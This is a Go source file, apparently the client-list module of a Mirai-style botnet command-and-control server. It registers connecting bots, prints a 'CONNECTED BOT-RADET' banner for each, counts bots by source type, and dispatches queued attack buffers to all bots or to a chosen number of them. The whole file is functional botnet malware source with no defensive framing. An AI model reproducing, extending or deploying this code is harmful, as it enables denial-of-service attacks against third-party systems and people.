package main

import (
    "time"
    "math/rand"
    "sync"
    "fmt"
)

type AttackSend struct {
    buf         []byte
    count       int
    botCata     string
}

type ClientList struct {
    uid         int
    count       int
    clients     map[int]*Bot
    addQueue    chan *Bot
    delQueue    chan *Bot
    atkQueue    chan *AttackSend
    totalCount  chan int
    cntView     chan int
    distViewReq chan int
    distViewRes chan map[string]int
    cntMutex    *sync.Mutex
}

func NewClientList() *ClientList {
    c := &ClientList{0, 0, make(map[int]*Bot), make(chan *Bot, 128), make(chan *Bot, 128), make(chan *AttackSend), make(chan int, 64), make(chan int), make(chan int), make(chan map[string]int), &sync.Mutex{}}
    go c.worker()
    go c.fastCountWorker()
    return c
}

func (this *ClientList) Count() int {
    this.cntMutex.Lock()
    defer this.cntMutex.Unlock()

    this.cntView <- 0
    return <-this.cntView
}

func (this *ClientList) Distribution() map[string]int {
    this.cntMutex.Lock()
    defer this.cntMutex.Unlock()
    this.distViewReq <- 0
    return <-this.distViewRes
}

func (cl *ClientList) AddClient(c *Bot) {
    cl.addQueue <- c
    
    addr := c.conn.RemoteAddr().String()
    sourceType := c.source
    
    const (
        green  = "\x1b[1;32m"
        white  = "\x1b[1;37m"
        yellow = "\x1b[1;33m"
        reset  = "\x1b[0m"
    )
    
    fmt.Printf(
        "%sCONNECTED %sBOT-RADET:%s%s %sType:%s%s%s\n",
        green,
        white, yellow, addr,
        white, yellow, sourceType, reset,
    )
}

func (this *ClientList) DelClient(c *Bot) {
    this.delQueue <- c
}

func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
    attack := &AttackSend{buf, maxbots, botCata}
    this.atkQueue <- attack
}

func (this *ClientList) fastCountWorker() {
    for {
        select {
        case delta := <-this.totalCount:
            this.count += delta
            break
        case <-this.cntView:
            this.cntView <- this.count
            break
        }
    }
}

func (this *ClientList) worker() {
    rand.Seed(time.Now().UTC().UnixNano())

    for {
        select {
        case add := <-this.addQueue:
            this.totalCount <- 1
            this.uid++
            add.uid = this.uid
            this.clients[add.uid] = add
            break
        case del := <-this.delQueue:
            this.totalCount <- -1
            delete(this.clients, del.uid)
            break
        case atk := <-this.atkQueue:
            if atk.count == -1 {
                for _,v := range this.clients {
                    if atk.botCata == "" || atk.botCata == v.source {
                        v.QueueBuf(atk.buf)
                    }
                }
            } else {
                var count int
                for _, v := range this.clients {
                    if count > atk.count {
                        break
                    }
                    if atk.botCata == "" || atk.botCata == v.source {
                        v.QueueBuf(atk.buf)
                        count++
                    }
                }
            }
            break
        case <-this.cntView:
            this.cntView <- this.count
            break
        case <-this.distViewReq:
            res := make(map[string]int)
            for _,v := range this.clients {
                if ok,_ := res[v.source]; ok > 0 {
                    res[v.source]++
                } else {
                    res[v.source] = 1
                }
            }
            this.distViewRes <- res
        }
    }
}

